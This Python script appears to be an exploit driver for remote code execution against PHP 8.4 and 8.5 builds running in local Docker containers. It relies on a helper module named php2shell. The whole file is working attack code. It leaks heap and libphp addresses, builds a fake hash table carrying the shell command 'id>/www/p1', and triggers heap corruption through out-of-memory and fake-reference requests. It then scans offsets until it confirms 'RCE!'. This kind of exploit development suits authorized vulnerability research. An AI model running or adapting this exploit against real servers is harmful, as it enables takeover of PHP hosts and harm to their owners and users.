#!/usr/bin/env python3
"""Try the 9bie path (cheap_oom_a + fake_ref_b) for the carrier-failing versions
(8.5.9, 8.4.24, 8.4.25), scanning s_off. The 9bie path works for 8.3.33/8.3.35."""
import sys, time, importlib.util, urllib.request, urllib.error, subprocess

spec = importlib.util.spec_from_file_location("p2s",
    r"C:\Users\likat\p2s52704\test\poc8335\php2shell.py")
p2s = importlib.util.module_from_spec(spec); spec.loader.exec_module(p2s)

VERSIONS = {
    "8.5.9":  (18121, 0x598160, 0x7b29a0, "p2s8509"),
    "8.4.24": (18122, 0x464530, 0x65d1e0, "p2s8424"),
    "8.4.25": (18123, 0x464c70, 0x65dc60, "p2s8425"),
}
CMD = b"id>/www/p1"

def http_get(url, timeout=12.0):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try: return e.code, e.read()
        except Exception: return e.code, b""
    except Exception as e:
        return 0, str(e).encode()

def leak(port):
    t = p2s.Target("http://127.0.0.1:%d/" % port, timeout=30)
    ex = p2s.Exploit(t, "x", 0, 0, 0)
    ex.rotate()
    chunk = 0
    for _ in range(4):
        ex.rotate(); chunk = ex.stage1()
        if chunk: break
    if not chunk: return None
    ex.rotate()
    libphp = 0
    for _ in range(4):
        ex.rotate(); libphp = ex.stage2()
        if libphp: break
    if not libphp: return None
    return chunk, libphp

def spray_9bie(port, zif, dtor, s_off, cname):
    res = leak(port)
    if not res: return False
    chunk, libphp = res
    S = chunk + s_off
    zif_addr = libphp + zif
    ht = p2s.build_ht(S, zif_addr, CMD, size=384)
    p2s.oom_a("127.0.0.1", port, False, 880, 64, 115)
    time.sleep(0.3)
    p2s.fake_ref_b("127.0.0.1", port, False, S, ht, 384, 500, 495)
    time.sleep(0.8)
    code, body = http_get("http://127.0.0.1:%d/p1" % port)
    return code == 200 and b"uid=" in body

# s_off candidates (8.3.x = 0xF6398; scan around it)
CANDS = [0xF6398, 0xF8398, 0xF7398, 0xF5398, 0xF4398, 0xF9398, 0xFA398,
         0xF6000, 0xF7000, 0xF8000, 0xF9000, 0xF0000, 0xFF398, 0xEF398, 0xE0000]

for ver, (port, zif, dtor, cname) in VERSIONS.items():
    print("=== %s (port %d) ===" % (ver, port), flush=True)
    found = False
    for s_off in CANDS:
        t0 = time.time()
        try:
            ok = spray_9bie(port, zif, dtor, s_off, ver)
        except Exception as e:
            print("  s_off=0x%x ERR %r" % (s_off, e), flush=True); continue
        print("  s_off=0x%x  %4.1fs  %s" % (s_off, time.time()-t0, "RCE!" if ok else "miss"), flush=True)
        if ok:
            code, body = http_get("http://127.0.0.1:%d/p1" % port)
            print("  >>> FOUND %s s_off=0x%x  %s" % (ver, s_off, body.decode().strip()), flush=True)
            found = True
            break
        subprocess.run(["docker", "exec", cname, "rm", "-f", "/www/p1"], capture_output=True)
    if not found:
        print("  no s_off landed for %s" % ver, flush=True)
print("DONE")
